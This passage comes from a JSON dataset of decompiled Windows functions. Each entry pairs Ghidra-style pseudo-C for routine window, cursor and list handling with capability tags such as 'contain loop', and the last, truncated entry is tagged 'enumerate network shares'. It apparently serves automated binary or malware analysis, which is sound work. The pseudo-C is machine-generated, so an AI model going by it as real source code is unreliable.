        "decompiled_code": "\nvoid __fastcall fcn.00437d88(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    for (; (0 < param_2 && (in_EAX != 0)); in_EAX = *(in_EAX + 100)) {\n        param_2 = param_2 + -1;\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "0043910c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043910c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    \n    iVar3 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar3 + -1) {\n        do {\n            piVar1 = fcn.004198b4();\n            if (param_2 == *piVar1) {\n                puVar2 = fcn.004198b4();\n                *puVar2 = 0;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    return;\n}\n",
        "token_count": 164
    },
    "0043b980": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0043b980(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX != NULL) {\n        do {\n            iVar1 = sub.user32.dll_IsWindow(in_EAX[1]);\n            if (iVar1 != 0) {\n                sub.user32.dll_EnableWindow(in_EAX[1], 0xffffffff);\n            }\n            in_EAX = *in_EAX;\n            fcn.00402f1c();\n        } while (in_EAX != NULL);\n    }\n    return;\n}\n",
        "token_count": 123
    },
    "0043f590": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0043f590(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    uVar1 = fcn.00458594(2);\n    iVar2 = (***0x495a24)(uVar1);\n    iVar3 = fcn.00443d70();\n    if (-1 < iVar3 + -1) {\n        do {\n            iVar4 = fcn.00443d5c();\n            if (iVar2 == *(iVar4 + 4)) {\n                uVar1 = fcn.00443d5c();\n                return uVar1;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    fcn.00444c48();\n    iVar3 = fcn.00443d70();\n    if (-1 < iVar3 + -1) {\n        do {\n            iVar4 = fcn.00443d5c();\n            if (iVar2 == *(iVar4 + 4)) {\n                uVar1 = fcn.00443d5c();\n                return uVar1;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 281
    },
    "00441014": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00441014(int32_t param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (param_2 != 0) {\n        do {\n            iVar3 = param_2;\n            param_2 = *(iVar3 + 0x30);\n            if (param_2 == 0) break;\n            cVar1 = fcn.004047dc();\n        } while (cVar1 == '\\0');\n        if ((iVar3 != 0) && (param_1 != iVar3)) {\n            uVar2 = fcn.00458594();\n            sub.user32.dll_SendMessageA(uVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 167
    },
    "00443f0c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00443f0c(void)\n\n{\n    uint *puVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    puVar1 = *(in_EAX + 0x5c);\n    while (puVar1 != NULL) {\n        iVar2 = puVar1[1];\n        if ((((-0x12 < iVar2) && (iVar2 < -0xb)) || (iVar2 == -0x15)) || (0 < iVar2)) {\n            sub.user32.dll_DestroyCursor();\n        }\n        puVar1 = *puVar1;\n        fcn.00402f1c();\n    }\n    iVar2 = sub.user32.dll_LoadCursorA(0, 0x7f00);\n    if (iVar2 != *(in_EAX + 0x60)) {\n        sub.user32.dll_DestroyCursor(*(in_EAX + 0x60));\n    }\n    return;\n}\n",
        "token_count": 203
    },
    "00444c10": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00444c10(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = *(*(in_EAX + 0x58) + 8);\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.004198b4();\n            fcn.00404650();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    (**(**(*0x49ac20 + 0x58) + 8))();\n    return;\n}\n",
        "token_count": 125
    },
    "00444c6c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.00444c6c(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar2 = fcn.00443d70();\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.00443d5c();\n            cVar1 = fcn.00443ad0();\n            if (cVar1 != '\\0') {\n                uVar3 = fcn.00443d5c();\n                return uVar3;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00444c48();\n    iVar2 = fcn.00443d70();\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.00443d5c();\n            cVar1 = fcn.00443ad0();\n            if (cVar1 != '\\0') {\n                uVar3 = fcn.00443d5c();\n                return uVar3;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 258
    },
    "004453dc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004453dc(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.00406774();\n    if (-1 < iVar1) {\n        iVar1 = iVar1 + 1;\n        iVar2 = 0;\n        do {\n            if (param_2 == *(*(in_EAX + 0xd0) + 4 + iVar2 * 0xc)) {\n                *(*(in_EAX + 0xd0) + 4 + iVar2 * 0xc) = 0;\n                *(*(in_EAX + 0xd0) + iVar2 * 0xc) = 0xffffffff;\n                return;\n            }\n            iVar2 = iVar2 + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 209
    },
    "00446d88": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00446d88(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    int32_t iVar5;\n    \n    iVar2 = fcn.00443dbc();\n    if (-1 < iVar2 + -1) {\n        do {\n            piVar3 = fcn.00443da8();\n            cVar1 = fcn.004588a0();\n            if (cVar1 != '\\0') {\n                uVar4 = fcn.00458594();\n                iVar5 = sub.user32.dll_IsWindowVisible(uVar4);\n                if (iVar5 != 0) {\n                    uVar4 = fcn.00458594();\n                    iVar5 = sub.user32.dll_IsWindowEnabled(uVar4);\n                    if (iVar5 != 0) {\n                        (**(*piVar3 + 0xec))();\n                    }\n                }\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 229
    },
    "00446fd4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00446fd4(void)\n\n{\n    int32_t iVar1;\n    uint arg_8h;\n    \n    iVar1 = fcn.00443da0();\n    if (-1 < iVar1 + -1) {\n        do {\n            arg_8h = 0;\n            fcn.00443d8c();\n            fcn.00451ae8(arg_8h);\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 112
    },
    "00447d6c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00447d6c(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    uVar3 = 0;\n    iVar1 = sub.user32.dll_GetCapture();\n    if (iVar1 == 0) {\n        iVar1 = *(in_EAX + 0x44);\n        if ((iVar1 == 0) || (*param_2 != *(iVar1 + 0x29c))) {\n            iVar1 = fcn.0044d290();\n            while ((iVar1 == 0 && (iVar2 = sub.user32.dll_GetParent(),  iVar2 != 0))) {\n                iVar1 = fcn.0044d290();\n            }\n        }\n        if (iVar1 != 0) {\n            uVar3 = fcn.0040484c();\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 214
    },
    "004490a8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004490a8(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if ((*(in_EAX + 0x4c) != 0) && (iVar2 = *(*(in_EAX + 0x4c) + 8),  -1 < iVar2 + -1)) {\n        do {\n            iVar1 = fcn.004198b4();\n            if (param_2 == iVar1) {\n                *(param_2 + 4) = 0;\n                fcn.004197a8();\n                return;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 176
    },
    "0044a6e8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044a6e8(uint param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    uchar in_ZF;\n    \n    fcn.00405974(param_2);\n    if (!in_ZF) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.00404800();\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0x4c))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        fcn.00405584();\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 194
    },
    "0044a9ec": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044a9ec(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if (param_2 != in_EAX[0x20]) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.00404800();\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0x6c))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        in_EAX[0x20] = param_2;\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 192
    },
    "0044aa48": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044aa48(uint param_1, int16_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if (param_2 != *(in_EAX + 0x21)) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.00404800();\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0x70))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        *(in_EAX + 0x21) = param_2;\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 194
    },
    "0044aaac": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044aaac(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if (param_2 != *(in_EAX + 0x86)) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.00404800();\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0x74))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        *(in_EAX + 0x86) = param_2;\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 192
    },
    "0044ac44": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0044ac44(uint param_1, int16_t param_2)\n\n{\n    int32_t iVar1;\n    int16_t iVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iStack20;\n    \n    iStack20 = -1;\n    iVar3 = (**(*in_EAX + 0x14))();\n    iVar1 = iStack20;\n    if (-1 < iVar3 + -1) {\n        iVar4 = 0;\n        do {\n            iVar2 = (**(*in_EAX + 0x18))();\n            iVar1 = iVar4;\n            if (param_2 == iVar2) break;\n            iVar4 = iVar4 + 1;\n            iVar3 = iVar3 + -1;\n            iVar1 = iStack20;\n        } while (iVar3 != 0);\n    }\n    iStack20 = iVar1;\n    return CONCAT44(iStack20, iStack20);\n}\n",
        "token_count": 220
    },
    "0044d6b0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0044d6b0(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    bool bVar2;\n    \n    *param_1 = 0;\n    bVar2 = false;\n    while( true ) {\n        if (*(in_EAX + 8) <= *param_1) {\n            return bVar2;\n        }\n        iVar1 = fcn.004198b4();\n        bVar2 = param_2 == *(iVar1 + 4);\n        if (bVar2) break;\n        *param_1 = *param_1 + 1;\n    }\n    return bVar2;\n}\n",
        "token_count": 158
    },
    "0044d6e8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0044d6e8(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = fcn.00458594();\n    iVar2 = iVar3;\n    while (iVar1 = iVar3,  iVar1 != 0) {\n        iVar3 = sub.user32.dll_GetParent();\n        iVar2 = iVar1;\n    }\n    return iVar2;\n}\n",
        "token_count": 105
    },
    "0044d7cc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0044d7cc(uint param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iStack20;\n    \n    iVar4 = 0;\n    if (*(in_EAX + 8) != 0) {\n        if (*(in_EAX + 8) == 1) {\n            iStack20 = 0x44d7e7;\n            piVar2 = fcn.004198b4();\n            iVar4 = *piVar2;\n        }\n        else {\n            iStack20 = sub.user32.dll_GetDesktopWindow(param_1);\n            iVar3 = sub.user32.dll_GetTopWindow();\n            while ((iVar4 == 0 && (iVar3 != 0))) {\n                cVar1 = fcn.0044d6b0();\n                if (cVar1 == '\\0') {\n                    iVar3 = func_0x004081e8(iVar3, 2);\n                }\n                else {\n                    iVar4 = **(*(in_EAX + 4) + iStack20 * 4);\n                }\n            }\n        }\n    }\n    return CONCAT44(iStack20, iVar4);\n}\n",
        "token_count": 278
    },
    "0044e250": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0044e250(void)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = sub.user32.dll_WindowFromPoint(*in_EAX, in_EAX[1]);\n    while ((iVar2 != 0 && (cVar1 = fcn.0044e1f0(),  cVar1 == '\\0'))) {\n        iVar2 = sub.user32.dll_GetParent();\n    }\n    return iVar2;\n}\n",
        "token_count": 109
    },
    "0044ed74": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0044ed74(void)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = sub.user32.dll_WindowFromPoint(*in_EAX, in_EAX[1]);\n    iVar2 = 0;\n    while ((iVar1 != 0 && (iVar2 = fcn.0044d290(),  iVar2 == 0))) {\n        iVar1 = sub.user32.dll_GetParent();\n    }\n    return iVar2;\n}\n",
        "token_count": 113
    },
    "0045039c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0045039c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        do {\n            cVar1 = fcn.004047dc();\n            if (cVar1 != '\\0') {\n                fcn.00440f1c();\n            }\n            in_EAX = *(in_EAX + 0x30);\n        } while (in_EAX != 0);\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "004543ec": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004543ec(uint param_1, uint32_t param_2)\n\n{\n    uint32_t in_EAX;\n    \n    for (; (param_2 != 0 && (in_EAX != param_2)); param_2 = *(param_2 + 0x30)) {\n    }\n    return in_EAX & 0xffffff00 | param_2 != 0;\n}\n",
        "token_count": 90
    },
    "00454d80": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00454d80(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.00419910();\n    iVar2 = *(*(in_EAX + 0x1d0) + 8) + -1;\n    if (iVar1 + 1 <= iVar2) {\n        iVar1 = (iVar2 - (iVar1 + 1)) + 1;\n        do {\n            iVar2 = fcn.004198b4();\n            if (*(iVar2 + 0x1b4) != 0) {\n                return *(iVar2 + 0x1b4);\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 181
    },
    "00459934": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00459934(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (param_2 == '\\0') {\n        *(in_EAX + 0x54) = *(in_EAX + 0x54) & 0xdfff;\n    }\n    else {\n        *(in_EAX + 0x54) = *(in_EAX + 0x54) | 0x2000;\n    }\n    if ((*(in_EAX + 0x1d0) != 0) && (iVar1 = *(*(in_EAX + 0x1d0) + 8),  -1 < iVar1 + -1)) {\n        do {\n            fcn.004198b4();\n            fcn.00459934();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 210
    },
    "0045a438": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0045a438(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    while( true ) {\n        if (in_EAX == 0) {\n            return 0;\n        }\n        cVar1 = fcn.0045a4d4();\n        if (cVar1 != '\\0') break;\n        in_EAX = *(in_EAX + 0xc);\n    }\n    return in_EAX;\n}\n",
        "token_count": 103
    },
    "0045a49c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0045a49c(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    for (iVar1 = *(in_EAX + 8); iVar1 != 0; iVar1 = *(iVar1 + 0xc)) {\n        iVar2 = iVar2 + 1;\n    }\n    return iVar2;\n}\n",
        "token_count": 95
    },
    "0045a4b0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0045a4b0(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    iVar1 = fcn.0045aaf8();\n    while (iVar1 != 0) {\n        iVar1 = fcn.0045aad0();\n        iVar2 = iVar2 + 1;\n    }\n    return iVar2;\n}\n",
        "token_count": 91
    },
    "0045a4d4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuchar fcn.0045a4d4(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar uVar3;\n    \n    if (*(in_EAX + 4) == 0) {\n        for (iVar2 = fcn.0045aaf8(); iVar2 != 0; iVar2 = *(iVar2 + 0xc)) {\n            cVar1 = fcn.0045a4d4();\n            if (cVar1 != '\\0') {\n                return 1;\n            }\n        }\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = *(*(in_EAX + 4) + 0x57);\n    }\n    return uVar3;\n}\n",
        "token_count": 167
    },
    "0045a848": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045a848(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = *(*(arg_8h + -4) + 0x14);\n    while( true ) {\n        if (iVar1 == 0) {\n            return 0;\n        }\n        iVar2 = fcn.0045aad0();\n        if (iVar2 != 0) break;\n        iVar1 = *(iVar1 + 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 122
    },
    "0045aa20": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0045aa20(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = *(in_EAX + 8);\n    do {\n        iVar1 = *(iVar1 + 0xc);\n    } while (iVar1 != 0);\n    return;\n}\n",
        "token_count": 69
    },
    "0045aa30": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0045aa30(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    fcn.0045aa1c();\n    for (iVar1 = *(in_EAX + 8); iVar1 != 0; iVar1 = *(iVar1 + 0xc)) {\n        iVar2 = fcn.0045a49c();\n        if (0 < iVar2) {\n            fcn.0045aa20();\n            fcn.0045aa30();\n        }\n    }\n    return;\n}\n",
        "token_count": 125
    },
    "0045aa70": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0045aa70(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = *(in_EAX + 8);\n    do {\n        if (iVar1 == 0) {\n            return;\n        }\n        iVar2 = fcn.0045a9f4();\n        iVar3 = fcn.0045a50c();\n        if (iVar2 < iVar3) {\ncode_r0x0045aaa4:\n            fcn.0045a6d8();\n            fcn.0045adb0(0x45c8ac, *(in_EAX + 0x1c));\n        }\n        else {\n            iVar2 = fcn.0045a9f4();\n            iVar3 = fcn.0045a554();\n            if (iVar3 < iVar2) goto code_r0x0045aaa4;\n        }\n        fcn.0045aa70();\n        iVar1 = *(iVar1 + 0xc);\n    } while( true );\n}\n",
        "token_count": 236
    },
    "0045aadc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0045aadc(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = *(in_EAX + 0x18);\n    while( true ) {\n        if (iVar2 == 0) {\n            return 0;\n        }\n        cVar1 = fcn.0045a4d4();\n        if (cVar1 != '\\0') break;\n        iVar2 = *(iVar2 + 0x18);\n    }\n    return iVar2;\n}\n",
        "token_count": 121
    },
    "0045ad74": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045ad74(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    (**(arg_8h + 8))();\n    if (*(in_EAX + 0xc) != 0) {\n        fcn.0045ad74(arg_8h);\n    }\n    if (*(in_EAX + 8) != 0) {\n        fcn.0045ad74(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "0045becc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045becc(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xc) != 0) {\n        fcn.0045becc(arg_8h);\n    }\n    if (*(in_EAX + 8) != 0) {\n        fcn.0045becc(arg_8h);\n    }\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 100
    },
    "0045c6a4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045c6a4(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    if (in_EAX != 0) {\n        iVar2 = fcn.0045aad0();\n        if ((iVar2 == 0) && (in_EAX != *(*(arg_8h + -4) + 100))) {\n            cVar1 = fcn.0045a4d4();\n            if (cVar1 != '\\0') {\n                if (*(*(arg_8h + -4) + 100) == *(in_EAX + 0x14)) {\n                    fcn.0045aa1c();\n                }\n                else {\n                    fcn.0045a9f4();\n                    fcn.0045aa1c();\n                }\n            }\n        }\n        iVar2 = arg_8h;\n        fcn.0045aaf8();\n        fcn.0045c6a4(iVar2);\n        fcn.0045aad0();\n        fcn.0045c6a4(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 256
    },
    "0045cb18": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045cb18(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    cVar1 = fcn.0045a454();\n    if (cVar1 == '\\0') {\n        *(in_EAX + 0x24) = 0;\n    }\n    else {\n        iVar2 = fcn.0045a50c();\n        *(in_EAX + 0x24) = *(in_EAX + 0x20) - iVar2;\n    }\n    if (*(in_EAX + 0x14) != 0) {\n        cVar1 = fcn.0045a4d4();\n        if (cVar1 == '\\0') {\n            fcn.0045cb18(arg_8h);\n        }\n    }\n    iVar2 = fcn.0045aadc();\n    if (iVar2 != 0) {\n        fcn.0045aadc();\n        fcn.0045aa30();\n    }\n    fcn.0045adb0(0x45c8ac, *(arg_8h + -4));\n    return;\n}\n",
        "token_count": 258
    },
    "0045e750": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0045e750(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint32_t uVar3;\n    uint unaff_EBX;\n    uchar *unaff_ESI;\n    uint *in_FS_OFFSET;\n    uint *arg_8h;\n    uint in_stack_ffffffd0;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uchar *var_18h;\n    uchar *var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = &stack0xfffffffc;\n    var_ch = 4;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_1ch = 0x45e89a;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_20h;\n    var_14h = unaff_ESI;\n    var_10h = unaff_EBX;\n    cVar1 = fcn.0045e8a8();\n    if (cVar1 == '\\0') {\n        uVar2 = fcn.0040700c();\n        in_stack_ffffffd0 = *(in_EAX + 0x30);\n        uVar3 = sub.oleaut32.dll_GetActiveObject(in_stack_ffffffd0, 0, uVar2);\n        if ((uVar3 & 0x80000000) != 0) {\n            fcn.0042bdf0();\n        }\n    }\n    else if (cVar1 == '\\x01') {\n        fcn.0042bdf0();\n    }\n    else if (cVar1 == '\\x02') {\n        uVar2 = fcn.0040700c();\n        in_stack_ffffffd0 = *(in_EAX + 0x30);\n        uVar3 = sub.oleaut32.dll_GetActiveObject(in_stack_ffffffd0, 0, uVar2);\n        if ((uVar3 & 0x80000000) != 0) {\n            arg_8h = &var_4h;\n            fcn.0042bdc4();\n            var_14h = var_18h;\n            var_10h = CONCAT31(var_10h._1_3_, 0xb);\n            fcn.0042bd3c();\n            var_ch = var_1ch;\n            var_8h._0_1_ = 0xb;\n            fcn.00407550(&var_14h);\n            fcn.0040afa0(arg_8h);\n            fcn.0042bba4(0, uVar3);\n            fcn.00404ec4();\n        }\n    }\n    else if (cVar1 == '\\x03') {\n        fcn.00405ea8();\n        fcn.0042bf08();\n    }\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    fcn.00405d28(0x45e8a1);\n    fcn.00405554();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 775
    },
    "00461b14": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00461b14(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    puStack24 = 0x461b26;\n    fcn.004059cc();\n    uStack28 = 0x461b96;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    uStack40 = 0x461b6f;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    iVar2 = 1;\n    puStack24 = &stack0xfffffffc;\n    while( true ) {\n        iVar1 = fcn.0040580c();\n        if (iVar1 < iVar2) break;\n        fcn.0046196c();\n        iVar2 = iVar2 + 1;\n    }\n    *in_FS_OFFSET = uStack44;\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x461b9d;\n    uStack28 = 0x461b95;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 306
    },
    "0046624c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0046624c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    for (iVar1 = 0; (iVar1 < *(in_EAX + 8) && (param_2 != *(*(in_EAX + 4) + iVar1 * 4))); iVar1 = iVar1 + 1) {\n    }\n    if (iVar1 == *(in_EAX + 8)) {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 127
    },
    "0046e840": {
        "rules": [
            "contain loop",
            "enumerate network shares"
        ],
